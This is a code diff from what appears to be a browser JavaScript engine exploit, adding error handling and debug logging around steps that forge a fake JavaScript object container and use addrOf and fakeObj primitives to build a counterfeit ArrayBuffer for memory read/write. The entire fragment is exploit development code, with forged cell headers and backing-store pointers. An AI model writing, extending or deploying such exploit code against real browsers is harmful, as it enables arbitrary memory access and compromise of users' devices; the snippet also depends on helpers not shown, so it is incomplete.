@@ -68,25 +68,37 @@
 
         // Read its backing store
         let dv = new DataView(ab);
-        let container = {
-            jsCellHeader: i2f(0x0108200700000000n), // JSObject cell
-            butterfly: ab_addr,                    // Simulate valid
-            vectorLength: i2f(0x100),
-            backingStore: i2f(ab_addr + 0x20n),    // Offset to real backingStore
-            fake: ab
-        };
+        let container;
 
-        let containerAddr = addrOf(container);
-        if (containerAddr !== null) {
-            log("[+] Fake container @ " + containerAddr.toString(16));
-        } else {
-            log("[ERROR] Failed to get container address.");
+        try {
+            container = {
+                jsCellHeader: i2f(0x0108200700000000n), // JSObject cell
+                butterfly: ab_addr,                    // Simulate valid
+                vectorLength: i2f(0x100),
+                backingStore: i2f(ab_addr + 0x20n),    // Offset to real backingStore
+                fake: ab
+            };
+            log("[DEBUG] Container created: " + JSON.stringify(container));
+        } catch (e) {
+            log("[ERROR] Failed to create container: " + e.message);
+            container = null;
         }
 
-        // Create fake backing ArrayBuffer
-        let fakeAb = fakeObj(containerAddr + 0x20n);
-        if (fakeAb === null) {
-            log("[ERROR] Failed to create fake ArrayBuffer.");
+        if (container !== null) {
+            let containerAddr = addrOf(container);
+            if (containerAddr !== null) {
+                log("[+] Fake container @ " + containerAddr.toString(16));
+            } else {
+                log("[ERROR] Failed to get container address.");
+            }
+
+            // Create fake backing ArrayBuffer
+            let fakeAb = fakeObj(containerAddr + 0x20n);
+            if (fakeAb === null) {
+                log("[ERROR] Failed to create fake ArrayBuffer.");
+            }
+        } else {
+            log("[ERROR] Container setup failed, skipping further operations.");
         }
 
         // R/W primitives
